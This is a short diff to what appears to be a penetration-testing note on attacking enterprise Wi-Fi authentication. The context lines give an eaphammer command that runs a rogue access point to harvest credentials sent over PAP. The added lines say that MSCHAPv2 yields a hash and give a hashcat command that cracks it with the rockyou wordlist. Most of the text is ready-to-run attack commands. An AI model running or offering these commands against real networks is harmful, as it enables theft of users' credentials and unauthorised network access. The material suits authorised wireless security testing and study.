@@ -3,3 +3,7 @@ Since PAP does not involve hashing or challenge-responses (unlike MSCHAPv2), the
 exposed the moment the tunnel is stripped away.
 
 eaphammer --interface $interface --essid $ap_name --creds --hw-mode g --channel $channel
+
+If mschapv2 is used as the inner auth method the eaphammer command will output a hash. this can be cracked with haschat
+
+hashcat -m 5500 captured.txt /usr/share/wordlists/rockyou.txt --force
